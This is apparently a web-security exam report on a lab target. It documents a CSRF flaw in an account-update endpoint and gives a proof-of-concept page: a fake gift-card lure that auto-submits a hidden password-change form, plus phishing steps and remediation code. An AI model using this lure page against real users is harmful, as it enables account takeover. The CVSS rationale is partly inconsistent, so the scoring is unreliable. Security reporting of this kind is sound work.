# FailSafe PWPA Exam - Phase 2: Account Page Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/account

---

## CSRF Vulnerability Testing - Account Update

### Vulnerability: Cross-Site Request Forgery (CSRF) - Reportable

**Description:**  
The account update endpoint (`POST /account/update`) lacks Cross-Site Request Forgery protection. An attacker can create malicious web pages that force authenticated users to change their account passwords without their knowledge or consent.

**Impact:**  
Attackers can compromise user accounts by tricking authenticated users into submitting password change requests. This can lead to account takeover, especially when combined with phishing attacks. Users may unknowingly change their passwords, locking themselves out or allowing attacker access.

**Technical Details:**

**Vulnerable Endpoint:** POST /account/update
**Missing Protection:** No CSRF tokens or SameSite cookie attributes
**Authentication Required:** Yes (session-based)
**Attack Vector:** Malicious HTML forms, links, or embedded content

---

## Step-by-Step Recreation

### Prerequisites:
- Valid user session (authenticated user browsing attacker's site)
- Malicious HTML page hosted on attacker's domain
- User interaction (clicking link or visiting malicious page)

### Step 1: Create Malicious CSRF Page

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Password Reset</title>
</head>
<body>
    <h1>Free Gift Card!</h1>
    <p>Click here to claim your $100 gift card:</p>
    
    <form action="http://10.0.0.10/account/update" method="POST" style="display:none;" id="csrfForm">
        <input type="hidden" name="password" value="attackerpassword">
        <input type="hidden" name="updatedPassword" value="attackerpassword">
        <input type="hidden" name="updateField" value="account">
    </form>
    
    <button onclick="document.getElementById('csrfForm').submit();">Claim Gift Card</button>
    
    <script>
        // Auto-submit for demonstration
        setTimeout(() => { document.getElementById('csrfForm').submit(); }, 1000);
    </script>
</body>
</html>
```

### Step 2: Host Malicious Page

Upload the HTML file to a web server under attacker's control.

### Step 3: Trick Victim into Visiting

Send phishing email or link to authenticated user: `http://attacker-site.com/csrf.html`

### Step 4: CSRF Attack Execution

When victim visits the page while logged into FailSafe:
1. Browser automatically sends session cookie with POST request
2. Server processes request as legitimate password change
3. Victim's password is changed to `attackerpassword`

**Response:** `{"success":true,"message":"Account password updated successfully!"}`

### Step 5: Verify Impact

Attacker can now login with the new password: `attackerpassword`

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 6.8 (Medium)  
**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N  
**Rationale:** Network attack, high complexity (requires user interaction), no privileges required, user interaction required, unchanged scope, high confidentiality impact.

**Likelihood / Exploitability:**
- **Exploitability:** Moderate - requires social engineering
- **Required Access Level:** None
- **Technical Skill Required:** Low
- **Available Tools:** Any web server, HTML knowledge

---

## Remediation

1. **Implement CSRF tokens:**
   ```javascript
   // Add to forms
   <input type="hidden" name="csrf_token" value="<%= csrfToken %>">
   
   // Validate on server
   app.post('/account/update', (req, res) => {
     if (!verifyCsrfToken(req.body.csrf_token)) {
       return res.status(403).json({ success: false, message: "CSRF token invalid" });
     }
     // Process request
   });
   ```

2. **Use SameSite cookie attribute:**
   ```javascript
   // Set session cookie with SameSite
   res.cookie('connect.sid', sessionId, { 
     httpOnly: true, 
     sameSite: 'strict' 
   });
   ```

3. **Implement double-submit cookie pattern**
4. **Add CAPTCHA or additional verification** for sensitive operations
5. **Use custom headers** for AJAX requests (not applicable for HTML forms)

---

## Status

**Status:** Confirmed  
**Severity:** Medium  
**Points:** Reportable (CSRF vulnerability)

---

[Screenshots to be added here]
- Screenshot of CSRF PoC HTML page
- Screenshot of successful CSRF attack response
- Screenshot of account takeover with new password